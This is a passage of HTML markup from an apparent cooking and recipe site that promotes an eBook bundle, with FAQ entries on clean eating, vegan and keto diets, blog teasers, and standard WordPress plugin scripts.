				<span class="elementor-icon elementor-animation-" >
				<svg aria-hidden="true" class="e-font-icon-svg e-fas-bookmark" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path d="M0 512V48C0 21.49 21.49 0 48 0h288c26.51 0 48 21.49 48 48v464L192 400 0 512z"></path></svg>				</span>
			</div>
						<div class="elementor-icon-box-content">
				<h3 class="elementor-icon-box-title">
					<span  >
						Creatives					</span>
				</h3>
									<p class="elementor-icon-box-description">
						Cooking can be that perfect outlet for those craving a more creative lifestyle. 					</p>
							</div>
		</div>
				</div>
				</div>
					</div>
		</div>
							</div>
		</section>
					</div>
		</div>
							</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-25bf85c elementor-section-height-min-height elementor-section-boxed elementor-section-height-default elementor-section-items-middle" data-id="25bf85c" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-7d433f2" data-id="7d433f2" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<section class="elementor-section elementor-inner-section elementor-element elementor-element-4139860 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="4139860" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-5e020c3" data-id="5e020c3" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-5e59b7f elementor-widget elementor-widget-accordion" data-id="5e59b7f" data-element_type="widget" data-widget_type="accordion.default">
				<div class="elementor-widget-container">
			<style>/*! elementor - v3.13.0 - 08-05-2023 */
.elementor-accordion{text-align:left}.elementor-accordion .elementor-accordion-item{border:1px solid #d5d8dc}.elementor-accordion .elementor-accordion-item+.elementor-accordion-item{border-top:none}.elementor-accordion .elementor-tab-title{margin:0;padding:15px 20px;font-weight:700;line-height:1;cursor:pointer;outline:none}.elementor-accordion .elementor-tab-title .elementor-accordion-icon{display:inline-block;width:1.5em}.elementor-accordion .elementor-tab-title .elementor-accordion-icon svg{width:1em;height:1em}.elementor-accordion .elementor-tab-title .elementor-accordion-icon.elementor-accordion-icon-right{float:right;text-align:right}.elementor-accordion .elementor-tab-title .elementor-accordion-icon.elementor-accordion-icon-left{float:left;text-align:left}.elementor-accordion .elementor-tab-title .elementor-accordion-icon .elementor-accordion-icon-closed{display:block}.elementor-accordion .elementor-tab-title .elementor-accordion-icon .elementor-accordion-icon-opened,.elementor-accordion .elementor-tab-title.elementor-active .elementor-accordion-icon-closed{display:none}.elementor-accordion .elementor-tab-title.elementor-active .elementor-accordion-icon-opened{display:block}.elementor-accordion .elementor-tab-content{display:none;padding:15px 20px;border-top:1px solid #d5d8dc}@media (max-width:767px){.elementor-accordion .elementor-tab-title{padding:12px 15px}.elementor-accordion .elementor-tab-title .elementor-accordion-icon{width:1.2em}.elementor-accordion .elementor-tab-content{padding:7px 15px}}.e-con-inner>.elementor-widget-accordion,.e-con>.elementor-widget-accordion{width:var(--container-widget-width);--flex-grow:var(--container-widget-flex-grow)}</style>		<div class="elementor-accordion" role="tablist">
							<div class="elementor-accordion-item">
					<div id="elementor-tab-title-9891" class="elementor-tab-title" data-tab="1" role="tab" aria-controls="elementor-tab-content-9891" aria-expanded="false">
													<span class="elementor-accordion-icon elementor-accordion-icon-right" aria-hidden="true">
															<span class="elementor-accordion-icon-closed"><svg class="e-font-icon-svg e-fas-plus" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M416 208H272V64c0-17.67-14.33-32-32-32h-32c-17.67 0-32 14.33-32 32v144H32c-17.67 0-32 14.33-32 32v32c0 17.67 14.33 32 32 32h144v144c0 17.67 14.33 32 32 32h32c17.67 0 32-14.33 32-32V304h144c17.67 0 32-14.33 32-32v-32c0-17.67-14.33-32-32-32z"></path></svg></span>
								<span class="elementor-accordion-icon-opened"><svg class="e-font-icon-svg e-fas-minus" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M416 208H32c-17.67 0-32 14.33-32 32v32c0 17.67 14.33 32 32 32h384c17.67 0 32-14.33 32-32v-32c0-17.67-14.33-32-32-32z"></path></svg></span>
														</span>
												<a class="elementor-accordion-title" href="#">What is Clean Eating?</a>
					</div>
					<div id="elementor-tab-content-9891" class="elementor-tab-content elementor-clearfix" data-tab="1" role="tabpanel" aria-labelledby="elementor-tab-title-9891"><p>Clean eating is about making sure your diet contains mainly natural and whole foods. The simple clean eating plan included in this bundle will allow you to create a schedule that you can stick to, which will reduce your reliance on processed, supermarket food and could save you money. And of course, there are loads of health benefits too.  </p></div>
				</div>
							<div class="elementor-accordion-item">
					<div id="elementor-tab-title-9892" class="elementor-tab-title" data-tab="2" role="tab" aria-controls="elementor-tab-content-9892" aria-expanded="false">
													<span class="elementor-accordion-icon elementor-accordion-icon-right" aria-hidden="true">
															<span class="elementor-accordion-icon-closed"><svg class="e-font-icon-svg e-fas-plus" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M416 208H272V64c0-17.67-14.33-32-32-32h-32c-17.67 0-32 14.33-32 32v144H32c-17.67 0-32 14.33-32 32v32c0 17.67 14.33 32 32 32h144v144c0 17.67 14.33 32 32 32h32c17.67 0 32-14.33 32-32V304h144c17.67 0 32-14.33 32-32v-32c0-17.67-14.33-32-32-32z"></path></svg></span>
								<span class="elementor-accordion-icon-opened"><svg class="e-font-icon-svg e-fas-minus" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M416 208H32c-17.67 0-32 14.33-32 32v32c0 17.67 14.33 32 32 32h384c17.67 0 32-14.33 32-32v-32c0-17.67-14.33-32-32-32z"></path></svg></span>
														</span>
												<a class="elementor-accordion-title" href="#">What are the health benefits of going vegan? </a>
					</div>
					<div id="elementor-tab-content-9892" class="elementor-tab-content elementor-clearfix" data-tab="2" role="tabpanel" aria-labelledby="elementor-tab-title-9892"><p>Many health benefits have been reported from people who have switched their diet to a vegan diet, including a better sense of overall wellbeing and weight loss. That&#8217;s because a vegan diet, when done properly, is rich in important nutrients that the body needs to operate at its best. The vegan recipe guide included in this bundle will help you to include more delicious vegan recipes in your diet, even if you don&#8217;t switch entirely.   </p></div>
				</div>
							<div class="elementor-accordion-item">
					<div id="elementor-tab-title-9893" class="elementor-tab-title" data-tab="3" role="tab" aria-controls="elementor-tab-content-9893" aria-expanded="false">
													<span class="elementor-accordion-icon elementor-accordion-icon-right" aria-hidden="true">
															<span class="elementor-accordion-icon-closed"><svg class="e-font-icon-svg e-fas-plus" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M416 208H272V64c0-17.67-14.33-32-32-32h-32c-17.67 0-32 14.33-32 32v144H32c-17.67 0-32 14.33-32 32v32c0 17.67 14.33 32 32 32h144v144c0 17.67 14.33 32 32 32h32c17.67 0 32-14.33 32-32V304h144c17.67 0 32-14.33 32-32v-32c0-17.67-14.33-32-32-32z"></path></svg></span>
								<span class="elementor-accordion-icon-opened"><svg class="e-font-icon-svg e-fas-minus" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M416 208H32c-17.67 0-32 14.33-32 32v32c0 17.67 14.33 32 32 32h384c17.67 0 32-14.33 32-32v-32c0-17.67-14.33-32-32-32z"></path></svg></span>
														</span>
												<a class="elementor-accordion-title" href="#">What is the keto diet and is it suitable for me? </a>
					</div>
					<div id="elementor-tab-content-9893" class="elementor-tab-content elementor-clearfix" data-tab="3" role="tabpanel" aria-labelledby="elementor-tab-title-9893"><p>The keto diet encourages your body to burn fats rather than carbohydrates. The diet itself is high in good fats, and low in carbohydrates. The eBook enables you to enjoy keto food in a healthy way and to understand who this type of diet is relevant and useful for. Even if a strict keto diet is not useful or necessary for you, many of these delicious recipes could still be included in your meal plan every so often. </p></div>
				</div>
								</div>
				</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-285b0c6" data-id="285b0c6" data-element_type="column">
			<div class="elementor-widget-wrap">
									</div>
		</div>
							</div>
		</section>
					</div>
		</div>
							</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-a9345c0 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="a9345c0" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-1cd66d3" data-id="1cd66d3" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-67c80a0 elementor-widget elementor-widget-spacer" data-id="67c80a0" data-element_type="widget" data-widget_type="spacer.default">
				<div class="elementor-widget-container">
					<div class="elementor-spacer">
			<div class="elementor-spacer-inner"></div>
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-0f268d5 elementor-widget elementor-widget-heading" data-id="0f268d5" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">From the blog...</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-373ccdd elementor-widget elementor-widget-html" data-id="373ccdd" data-element_type="widget" data-widget_type="html.default">
				<div class="elementor-widget-container">
			
		<div class="sp_wpspwpost_static wpspw-design-1 wpspw-grid-3 wpspw-clearfix ">

			
<div class="wpspw-post-grid wpspw-medium-4 wpspw-columns first">
	<div class="wpspw-post-grid-content  ">

					<div class="wpspw-post-image-bg">
				<a href="the-secret-power-of-cbt-for-clean-eating/index.html">
					<img fifu-featured="1" src="../i2.wp.com/aztechost.com/images/recipe/uploads/2021/03/pexels-fauxels-3184183-scaled75d5.jpg?resize=2560&amp;w=2560" alt="The Secret Power of CBT for Clean Eating" />
				</a>
			</div>
					<div class="wpspw-post-categories"><a href="category/clean-eating/index.html">Clean Eating</a></div>
		
		<h2 class="wpspw-post-title">
			<a href="the-secret-power-of-cbt-for-clean-eating/index.html">The Secret Power of CBT for Clean Eating</a>
		</h2>

					<div class="wpspw-post-date">
									<span>
						By <a href="author/admin/index.html">admin</a>
					</span>
				&nbsp;/&nbsp;December 26, 2022			</div>
					<div class="wpspw-post-content">
									<div>
						One of the hardest parts of eating clean is turning down the tasty snacks that you know are bad for...					</div>
					<a class="wpspw-readmorebtn" href="the-secret-power-of-cbt-for-clean-eating/index.html">Read More</a>
							</div>
			</div>
</div>
<div class="wpspw-post-grid wpspw-medium-4 wpspw-columns ">
	<div class="wpspw-post-grid-content  ">

					<div class="wpspw-post-image-bg">
				<a href="how-to-improve-your-energy-levels-with-the-right-diet/index.html">
					<img fifu-featured="1" src="../i3.wp.com/aztechost.com/images/recipe/uploads/2021/04/Untitled-design-152b8d.png?resize=2000&amp;w=2000" alt="How to Improve Your Energy Levels With the Right Diet" />
				</a>
			</div>
					<div class="wpspw-post-categories"><a href="category/diet/index.html">Diet</a> <a href="category/energy/index.html">Energy</a></div>
		
		<h2 class="wpspw-post-title">
			<a href="how-to-improve-your-energy-levels-with-the-right-diet/index.html">How to Improve Your Energy Levels With the Right Diet</a>
		</h2>

					<div class="wpspw-post-date">
									<span>
						By <a href="author/admin/index.html">admin</a>
					</span>
				&nbsp;/&nbsp;October 27, 2022			</div>
					<div class="wpspw-post-content">
									<div>
						Wouldn’t life just be a lot better if you had more energy? Serious – low energy is probably responsible for...					</div>
					<a class="wpspw-readmorebtn" href="how-to-improve-your-energy-levels-with-the-right-diet/index.html">Read More</a>
							</div>
			</div>
</div>
<div class="wpspw-post-grid wpspw-medium-4 wpspw-columns ">
	<div class="wpspw-post-grid-content  ">

					<div class="wpspw-post-image-bg">
				<a href="the-easiest-ways-to-cut-calories-and-junk-from-your-diet/index.html">
					<img fifu-featured="1" src="../i0.wp.com/aztechost.com/images/recipe/uploads/2021/03/pexels-ella-olsson-1640773-scaled75d5.jpg?resize=2560&amp;w=2560" alt="The Easiest Ways to Cut Calories and Junk From Your Diet" />
				</a>
			</div>
					<div class="wpspw-post-categories"><a href="category/diet/index.html">Diet</a></div>
		
		<h2 class="wpspw-post-title">
			<a href="the-easiest-ways-to-cut-calories-and-junk-from-your-diet/index.html">The Easiest Ways to Cut Calories and Junk From Your Diet</a>
		</h2>

					<div class="wpspw-post-date">
									<span>
						By <a href="author/admin/index.html">admin</a>
					</span>
				&nbsp;/&nbsp;May 22, 2022			</div>
					<div class="wpspw-post-content">
									<div>
						If you’re trying to improve your diet, you’ll often find it’s easier to focus on the things you want to...					</div>
					<a class="wpspw-readmorebtn" href="the-easiest-ways-to-cut-calories-and-junk-from-your-diet/index.html">Read More</a>
							</div>
			</div>
</div>
					</div>

			</div>
				</div>
				<div class="elementor-element elementor-element-0e8d141 elementor-widget elementor-widget-spacer" data-id="0e8d141" data-element_type="widget" data-widget_type="spacer.default">
				<div class="elementor-widget-container">
					<div class="elementor-spacer">
			<div class="elementor-spacer-inner"></div>
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-8599024 elementor-widget elementor-widget-spacer" data-id="8599024" data-element_type="widget" data-widget_type="spacer.default">
				<div class="elementor-widget-container">
					<div class="elementor-spacer">
			<div class="elementor-spacer-inner"></div>
		</div>
				</div>
				</div>
					</div>
		</div>
							</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-fc049f0 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="fc049f0" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
							<div class="elementor-background-overlay"></div>
							<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-66 elementor-top-column elementor-element elementor-element-2f1e6b7" data-id="2f1e6b7" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-690592b elementor-widget elementor-widget-spacer" data-id="690592b" data-element_type="widget" data-widget_type="spacer.default">
				<div class="elementor-widget-container">
					<div class="elementor-spacer">
			<div class="elementor-spacer-inner"></div>
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-9d001b9 elementor-widget elementor-widget-heading" data-id="9d001b9" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Subscribe to our email newsletter</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-0944142 elementor-widget elementor-widget-text-editor" data-id="0944142" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<p>Sign up to our email newsletter and be the first to know about special offers and deals, healthy cooking hints and tips, new articles added to the site and much more&#8230;</p>						</div>
				</div>
				<div class="elementor-element elementor-element-d5c6618 elementor-widget elementor-widget-html" data-id="d5c6618" data-element_type="widget" data-widget_type="html.default">
				<div class="elementor-widget-container">
			[newsletter_form type="minimal"]		</div>
				</div>
				<div class="elementor-element elementor-element-2380f02 elementor-widget elementor-widget-spacer" data-id="2380f02" data-element_type="widget" data-widget_type="spacer.default">
				<div class="elementor-widget-container">
					<div class="elementor-spacer">
			<div class="elementor-spacer-inner"></div>
		</div>
				</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-d2ea6c0" data-id="d2ea6c0" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-800679c elementor-widget elementor-widget-spacer" data-id="800679c" data-element_type="widget" data-widget_type="spacer.default">
				<div class="elementor-widget-container">
					<div class="elementor-spacer">
			<div class="elementor-spacer-inner"></div>
		</div>
				</div>
				</div>
					</div>
		</div>
							</div>
		</section>
							</div>
		
		<footer itemtype="https://schema.org/WPFooter" itemscope="itemscope" id="colophon" role="contentinfo">
			<div class='footer-width-fixer'>		<div data-elementor-type="wp-post" data-elementor-id="1112" class="elementor elementor-1112">
									<section class="elementor-section elementor-top-section elementor-element elementor-element-dfb067d elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="dfb067d" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-34e746f" data-id="34e746f" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-b0f906e elementor-widget elementor-widget-spacer" data-id="b0f906e" data-element_type="widget" data-widget_type="spacer.default">
				<div class="elementor-widget-container">
					<div class="elementor-spacer">
			<div class="elementor-spacer-inner"></div>
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-1b2ed8b elementor-widget elementor-widget-heading" data-id="1b2ed8b" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">Contact</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-df04d3c elementor-widget elementor-widget-text-editor" data-id="df04d3c" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<p>info@tastycookingideas.com</p><p> </p>						</div>
				</div>
				<div class="elementor-element elementor-element-d8428c6 elementor-widget elementor-widget-heading" data-id="d8428c6" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">We are social</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-eec30ac e-grid-align-left elementor-shape-rounded elementor-grid-0 elementor-widget elementor-widget-social-icons" data-id="eec30ac" data-element_type="widget" data-widget_type="social-icons.default">
				<div class="elementor-widget-container">
			<style>/*! elementor - v3.13.0 - 08-05-2023 */
.elementor-widget-social-icons.elementor-grid-0 .elementor-widget-container,.elementor-widget-social-icons.elementor-grid-mobile-0 .elementor-widget-container,.elementor-widget-social-icons.elementor-grid-tablet-0 .elementor-widget-container{line-height:1;font-size:0}.elementor-widget-social-icons:not(.elementor-grid-0):not(.elementor-grid-tablet-0):not(.elementor-grid-mobile-0) .elementor-grid{display:inline-grid}.elementor-widget-social-icons .elementor-grid{grid-column-gap:var(--grid-column-gap,5px);grid-row-gap:var(--grid-row-gap,5px);grid-template-columns:var(--grid-template-columns);justify-content:var(--justify-content,center);justify-items:var(--justify-content,center)}.elementor-icon.elementor-social-icon{font-size:var(--icon-size,25px);line-height:var(--icon-size,25px);width:calc(var(--icon-size, 25px) + (2 * var(--icon-padding, .5em)));height:calc(var(--icon-size, 25px) + (2 * var(--icon-padding, .5em)))}.elementor-social-icon{--e-social-icon-icon-color:#fff;display:inline-flex;background-color:#69727d;align-items:center;justify-content:center;text-align:center;cursor:pointer}.elementor-social-icon i{color:var(--e-social-icon-icon-color)}.elementor-social-icon svg{fill:var(--e-social-icon-icon-color)}.elementor-social-icon:last-child{margin:0}.elementor-social-icon:hover{opacity:.9;color:#fff}.elementor-social-icon-android{background-color:#a4c639}.elementor-social-icon-apple{background-color:#999}.elementor-social-icon-behance{background-color:#1769ff}.elementor-social-icon-bitbucket{background-color:#205081}.elementor-social-icon-codepen{background-color:#000}.elementor-social-icon-delicious{background-color:#39f}.elementor-social-icon-deviantart{background-color:#05cc47}.elementor-social-icon-digg{background-color:#005be2}.elementor-social-icon-dribbble{background-color:#ea4c89}.elementor-social-icon-elementor{background-color:#d30c5c}.elementor-social-icon-envelope{background-color:#ea4335}.elementor-social-icon-facebook,.elementor-social-icon-facebook-f{background-color:#3b5998}.elementor-social-icon-flickr{background-color:#0063dc}.elementor-social-icon-foursquare{background-color:#2d5be3}.elementor-social-icon-free-code-camp,.elementor-social-icon-freecodecamp{background-color:#006400}.elementor-social-icon-github{background-color:#333}.elementor-social-icon-gitlab{background-color:#e24329}.elementor-social-icon-globe{background-color:#69727d}.elementor-social-icon-google-plus,.elementor-social-icon-google-plus-g{background-color:#dd4b39}.elementor-social-icon-houzz{background-color:#7ac142}.elementor-social-icon-instagram{background-color:#262626}.elementor-social-icon-jsfiddle{background-color:#487aa2}.elementor-social-icon-link{background-color:#818a91}.elementor-social-icon-linkedin,.elementor-social-icon-linkedin-in{background-color:#0077b5}.elementor-social-icon-medium{background-color:#00ab6b}.elementor-social-icon-meetup{background-color:#ec1c40}.elementor-social-icon-mixcloud{background-color:#273a4b}.elementor-social-icon-odnoklassniki{background-color:#f4731c}.elementor-social-icon-pinterest{background-color:#bd081c}.elementor-social-icon-product-hunt{background-color:#da552f}.elementor-social-icon-reddit{background-color:#ff4500}.elementor-social-icon-rss{background-color:#f26522}.elementor-social-icon-shopping-cart{background-color:#4caf50}.elementor-social-icon-skype{background-color:#00aff0}.elementor-social-icon-slideshare{background-color:#0077b5}.elementor-social-icon-snapchat{background-color:#fffc00}.elementor-social-icon-soundcloud{background-color:#f80}.elementor-social-icon-spotify{background-color:#2ebd59}.elementor-social-icon-stack-overflow{background-color:#fe7a15}.elementor-social-icon-steam{background-color:#00adee}.elementor-social-icon-stumbleupon{background-color:#eb4924}.elementor-social-icon-telegram{background-color:#2ca5e0}.elementor-social-icon-thumb-tack{background-color:#1aa1d8}.elementor-social-icon-tripadvisor{background-color:#589442}.elementor-social-icon-tumblr{background-color:#35465c}.elementor-social-icon-twitch{background-color:#6441a5}.elementor-social-icon-twitter{background-color:#1da1f2}.elementor-social-icon-viber{background-color:#665cac}.elementor-social-icon-vimeo{background-color:#1ab7ea}.elementor-social-icon-vk{background-color:#45668e}.elementor-social-icon-weibo{background-color:#dd2430}.elementor-social-icon-weixin{background-color:#31a918}.elementor-social-icon-whatsapp{background-color:#25d366}.elementor-social-icon-wordpress{background-color:#21759b}.elementor-social-icon-xing{background-color:#026466}.elementor-social-icon-yelp{background-color:#af0606}.elementor-social-icon-youtube{background-color:#cd201f}.elementor-social-icon-500px{background-color:#0099e5}.elementor-shape-rounded .elementor-icon.elementor-social-icon{border-radius:10%}.elementor-shape-circle .elementor-icon.elementor-social-icon{border-radius:50%}</style>		<div class="elementor-social-icons-wrapper elementor-grid">
							<span class="elementor-grid-item">
					<a class="elementor-icon elementor-social-icon elementor-social-icon-facebook elementor-repeater-item-dd6c376" target="_blank">
						<span class="elementor-screen-only">Facebook</span>
						<svg class="e-font-icon-svg e-fab-facebook" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"></path></svg>					</a>
				</span>
							<span class="elementor-grid-item">
					<a class="elementor-icon elementor-social-icon elementor-social-icon-twitter elementor-repeater-item-88b2db7" target="_blank">
						<span class="elementor-screen-only">Twitter</span>
						<svg class="e-font-icon-svg e-fab-twitter" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg>					</a>
				</span>
							<span class="elementor-grid-item">
					<a class="elementor-icon elementor-social-icon elementor-social-icon-youtube elementor-repeater-item-d1455d0" target="_blank">
						<span class="elementor-screen-only">Youtube</span>
						<svg class="e-font-icon-svg e-fab-youtube" viewBox="0 0 576 512" xmlns="http://www.w3.org/2000/svg"><path d="M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z"></path></svg>					</a>
				</span>
					</div>
				</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-1f392de" data-id="1f392de" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-a623ef9 elementor-widget elementor-widget-spacer" data-id="a623ef9" data-element_type="widget" data-widget_type="spacer.default">
				<div class="elementor-widget-container">
					<div class="elementor-spacer">
			<div class="elementor-spacer-inner"></div>
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-f5984ca elementor-widget elementor-widget-heading" data-id="f5984ca" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">Useful links</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-8486524 elementor-widget elementor-widget-wp-widget-nav_menu" data-id="8486524" data-element_type="widget" data-widget_type="wp-widget-nav_menu.default">
				<div class="elementor-widget-container">
			<div class="menu-footer-container"><ul id="menu-footer" class="menu"><li id="menu-item-519" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-519"><a href="privacy-policy/index.html">Privacy Policy</a></li>
<li id="menu-item-1156" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1156"><a href="blog/index.html">Blog</a></li>
<li id="menu-item-520" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-520"><a href="contact/index.html">Contact</a></li>
</ul></div>		</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-b35b113" data-id="b35b113" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-46cc72a elementor-widget elementor-widget-spacer" data-id="46cc72a" data-element_type="widget" data-widget_type="spacer.default">
				<div class="elementor-widget-container">
					<div class="elementor-spacer">
			<div class="elementor-spacer-inner"></div>
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-b32ec8b elementor-widget elementor-widget-heading" data-id="b32ec8b" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">From the blog</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-8d3b347 elementor-widget elementor-widget-wp-widget-recent-posts" data-id="8d3b347" data-element_type="widget" data-widget_type="wp-widget-recent-posts.default">
				<div class="elementor-widget-container">
			
		
		<h5>Recent Posts</h5>
		<ul>
											<li>
					<a href="the-secret-power-of-cbt-for-clean-eating/index.html">The Secret Power of CBT for Clean Eating</a>
									</li>
											<li>
					<a href="how-to-improve-your-energy-levels-with-the-right-diet/index.html">How to Improve Your Energy Levels With the Right Diet</a>
									</li>
											<li>
					<a href="the-easiest-ways-to-cut-calories-and-junk-from-your-diet/index.html">The Easiest Ways to Cut Calories and Junk From Your Diet</a>
									</li>
					</ul>

				</div>
				</div>
					</div>
		</div>
							</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-ea1d215 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="ea1d215" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-62f38a8" data-id="62f38a8" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-4cc9ba7 elementor-widget elementor-widget-text-editor" data-id="4cc9ba7" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<p>© 2022 All Rights Reserved</p>						</div>
				</div>
					</div>
		</div>
							</div>
		</section>
							</div>
		</div>		</footer>
	</div><!-- #page -->
	<script type="text/javascript">
		(function () {
			var c = document.body.className;
			c = c.replace(/woocommerce-no-js/, 'woocommerce-js');
			document.body.className = c;
		})();
	</script>
	<link rel='stylesheet' id='fifu-woo-css' href='wp-content/plugins/featured-image-from-url/includes/html/css/woo5462.css?ver=4.2.6' type='text/css' media='all' />
<style id='fifu-woo-inline-css' type='text/css'>
img.zoomImg {display:inline !important}
</style>
<link rel='stylesheet' id='e-animations-css' href='wp-content/plugins/elementor/assets/lib/animations/animations.min7ff8.css?ver=3.13.0' type='text/css' media='all' />
<script type='text/javascript' src='wp-content/plugins/contact-form-7/includes/swv/js/indexcfaa.js?ver=5.7.6' id='swv-js'></script>
<script type='text/javascript' id='contact-form-7-js-extra'>
/* <![CDATA[ */
var wpcf7 = {"api":{"root":"https:\/\/tastycookingideas.com\/wp-json\/","namespace":"contact-form-7\/v1"},"cached":"1"};
/* ]]> */
</script>
<script type='text/javascript' src='wp-content/plugins/contact-form-7/includes/js/indexcfaa.js?ver=5.7.6' id='contact-form-7-js'></script>
<script type='text/javascript' src='wp-content/plugins/woocommerce/assets/js/jquery-blockui/jquery.blockUI.minb69f.js?ver=2.7.0-wc.7.6.1' id='jquery-blockui-js'></script>
<script type='text/javascript' id='wc-add-to-cart-js-extra'>
/* <![CDATA[ */
